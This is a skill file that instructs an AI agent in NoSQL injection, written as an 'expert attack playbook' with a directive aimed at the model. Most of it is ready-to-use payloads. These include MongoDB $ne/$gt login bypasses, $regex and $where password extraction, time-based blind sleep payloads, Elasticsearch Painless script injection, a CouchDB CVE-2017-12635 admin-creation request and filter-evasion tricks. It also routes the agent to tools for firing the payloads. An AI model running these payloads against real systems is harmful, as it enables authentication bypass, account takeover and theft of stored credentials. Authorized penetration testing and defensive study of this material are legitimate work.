---
name: nosql-injection
description: >-
  NoSQL injection and MongoDB operator injection playbook. Use when parameters
  or JSON bodies may reach MongoDB, CouchDB, Elasticsearch-style query DSL,
  JSON query filters, $where JavaScript, GraphQL-to-NoSQL resolvers, or type
  confusion in document databases.
---

# SKILL: NoSQL Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: NoSQL injection covers MongoDB operator injection, $where JavaScript execution, type confusion (object vs scalar), CouchDB/Mango query manipulation, Elasticsearch query DSL abuse, and cross-language NoSQL sinks. Base models often treat NoSQL as "just MongoDB" — this skill covers multiple engines and the type-confusion attack surface unique to document databases.

## QUICK START

### First-pass probes

| Situation | Payload | Why |
|---|---|---|
| Login / auth bypass | `{"$ne": ""}` or `{"$gt": ""}` | Matches any non-empty / any value |
| JSON body scalar → object | `{"price": {"$gt": 0}}` | Type confusion: scalar expected, object injected |
| URL parameter | `?username[$ne]=` | Query-string operator injection |
| Search / filter | `{"$regex": ".*"}` | Matches everything |
| `$where` detection | `"$where": "1==1"` | JavaScript execution in MongoDB |
| Array coercion | `?role[]=admin` | PHP/Express may cast to array or $in |

### First-pass probe set

```text
{"$ne": ""}
{"$gt": ""}
{"$regex": ".*"}
?username[$ne]=
?username[$gt]=
{"$where": "sleep(5000)"}
{"$where": "1==1"}
[{"$gt": ""}]
```

---

## 1. MONGODB OPERATOR INJECTION

### Authentication Bypass

```json
// POST /login
{"username": {"$ne": ""}, "password": {"$ne": ""}}
// Matches any user with any non-empty password

// Targeted:
{"username": "admin", "password": {"$gt": ""}}
// Login as admin with any password

// URL-encoded equivalent:
username=admin&password[$ne]=
```

### Boolean / Error-Based Data Extraction

```json
// Character-by-character extraction via $regex:
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ad"}}
// Adjust regex until full password extracted

// $where with JavaScript:
{"$where": "this.password.match(/^a/)"}
{"$where": "this.password[0] == 'a'"}
```

### $where JavaScript Execution

```javascript
// $where evaluates arbitrary JavaScript in MongoDB
{"$where": "sleep(5000)"}  // Time-based blind
{"$where": "this.username == 'admin' && this.password[0] == 'a'"}

// Error-based extraction:
{"$where": "function(){if(this.password[0]=='a'){return true;}else{throw 'err';}}"}
```

### Type Confusion Attacks

```json
// When app expects scalar but processes object:
// Normal: {"age": 25}
// Injection: {"age": {"$gt": 0, "$lt": 200}}

// Numeric vs string confusion:
{"_id": {"$gt": ""}}  // ObjectIds are lexicographically comparable

// $type operator:
{"username": {"$type": "string"}}  // Filter by BSON type
```

### $lookup and Aggregation Pipeline Injection

```json
// If aggregation pipeline accepts user input:
[{"$match": {"$where": "sleep(5000)"}}]

// $lookup for cross-collection data:
[{"$lookup": {"from": "users", "localField": "userId", "foreignField": "_id", "as": "user"}}]
```

---

## 2. COUCHDB INJECTION

### Mango Query Injection

```json
// CouchDB Mango queries use selector syntax similar to MongoDB:
{"selector": {"username": "admin"}}
// Injection:
{"selector": {"username": {"$ne": ""}}}
```

### MapReduce View Injection

```
// If user input reaches map function:
// CouchDB view functions are JavaScript
function(doc) { emit(doc._id, doc); }
// Injection in key or value parameters
```

### CouchDB Privilege Escalation

```
// CVE-2017-12635: Admin creation via JSON type confusion
PUT /_users/org.couchdb.user:attacker
Content-Type: application/json

{"type": "user", "name": "attacker", "roles": ["_admin"], "password": "password"}
// CouchDB interpreted duplicate keys differently in Erlang JSON parser
```

---

## 3. ELASTICSEARCH QUERY DSL ABUSE

### Query String Injection

```json
// If user input reaches query_string parameter:
GET /_search?q=username:admin%20AND%20password:*
// Extract all fields
GET /_search?q=*
```

### Bool Query Manipulation

```json
// Original: {"query": {"match": {"status": "USER_INPUT"}}}
// Injection:
{"query": {"bool": {"must": [{"match_all": {}}]}}}
```

### Script Injection (Painless)

```json
// If script_score or runtime_mapping accepts user input:
{"query": {"script_score": {"query": {"match_all": {}}, "script": "Math.random()"}}}
// Time-based:
{"script": "Thread.sleep(5000); return 1;"}
// Data exfiltration:
{"script": "if(doc['password'].value.charAt(0)=='a'){return 1;}else{return 0;}"}
```

---

## 4. BLIND NOSQL INJECTION

### Time-Based (MongoDB $where)

```json
{"$where": "sleep(5000) && this.username == 'admin'"}
// Response delay = condition true
{"$where": "if(this.password[0]=='a'){sleep(5000);}"}
```

### Boolean-Based (Response Differential)

```json
// Request 1: {"username": "admin", "password": {"$regex": "^a"}}
// Request 2: {"username": "admin", "password": {"$regex": "^b"}}
// Compare response length/status to infer characters
```

### Error-Based

```json
// MongoDB error messages may leak data:
{"$where": "this.username.match(/^(.)/) === null ? x : y"}
// Trigger error containing field value
```

---

## 5. FILTER BYPASS TECHNIQUES

| Filter | Bypass |
|--------|--------|
| `$` operator blocked | Unicode: `$` or URL-encode `%24` |
| Keywords filtered | `{$where: "this[field] == value"}` (bracket notation) |
| JSON validation strict | Send as URL parameters: `field[$ne]=` |
| Object injection blocked | Array wrapping: `[{"$gt": ""}]` |
| `sleep()` filtered | Use `while(Date.now()-t<5000){}` |
| Quotes escaped | `$regex` with unquoted patterns |
| Input length limit | Short operators: `$ne`, `$gt`, `$in` |

---

## 6. CROSS-LANGUAGE SINKS

### Node.js (Express + body-parser)

```javascript
// query-string parses: ?user[$ne]= → {user: {$ne: ""}}
app.get('/search', (req, res) => {
  db.collection('items').find(req.query).toArray();
  // req.query directly passed to MongoDB
});
```

### PHP (MongoDB Driver)

```php
// $_GET/$_POST parsing: ?username[$ne]= → array('$ne' => '')
$collection->find(['username' => $_GET['username']]);
// If username is array, MongoDB receives operator
```

### Python (PyMongo)

```python
# Flask JSON body:
data = request.get_json()
db.users.find(data)
# If JSON body contains {"username": {"$ne": ""}}, injection works

# BSON type confusion:
import bson
bson.BSON(b'...')  # Binary BSON injection
```

---

## DECISION TREE

```
Found JSON body / query param reaching document DB?
├── MongoDB suspected?
│   ├── Test operator injection: $ne, $gt, $regex
│   ├── Test $where JavaScript execution
│   ├── Type confusion: inject object where scalar expected
│   └── Check for aggregation pipeline injection
│
├── CouchDB?
│   ├── Mango query selector injection
│   ├── Check CVE-2017-12635 (admin creation)
│   └── MapReduce view injection
│
├── Elasticsearch?
│   ├── Query string injection
│   ├── Bool query manipulation
│   └── Painless script injection
│
└── Unknown engine?
    ├── Probe with universal: {"$ne": ""}, {"$gt": ""}
    ├── Try URL-encoded operators
    └── Time-based via $where or script injection
```

---

## TESTING CHECKLIST

- [ ] Identify NoSQL engine (MongoDB, CouchDB, Elasticsearch, other)
- [ ] Test operator injection ($ne, $gt, $regex, $in, $where)
- [ ] Test type confusion (object where scalar expected)
- [ ] Test authentication bypass with $ne/$gt
- [ ] Test boolean-based data extraction via $regex
- [ ] Test time-based blind via $where sleep()
- [ ] Test URL parameter operator injection (bracket notation)
- [ ] Test aggregation pipeline injection
- [ ] Test filter bypass (unicode, encoding, array wrapping)
- [ ] Check for cross-language sink patterns (Express body-parser, PHP $_GET)

---

## MCP TOOLS

| Tool | Use Case |
|------|----------|
| `http_framework_test` | Send crafted NoSQL injection payloads |
| `http_repeater` | Replay and diff NoSQL probe responses |
| `api_fuzzer` | Fuzz API endpoints with NoSQL payloads |
| `browser_agent_inspect` | Inspect application for NoSQL usage patterns |

---

## RELATED ROUTING

- Use [idor](../idor/SKILL.md) when the issue is object ownership or tenant filtering.
- Use [business-logic](../business-logic/SKILL.md) when NoSQL type confusion changes price, quantity, coupon, or workflow state.
- Use [graphql](../graphql/SKILL.md) when the query surface is GraphQL-to-NoSQL.
- Use [burp-mcp](../burp-mcp/SKILL.md) for replay and response diffing from Burp history.
- Use [api-security](../api-security/SKILL.md) for general API security workflow.
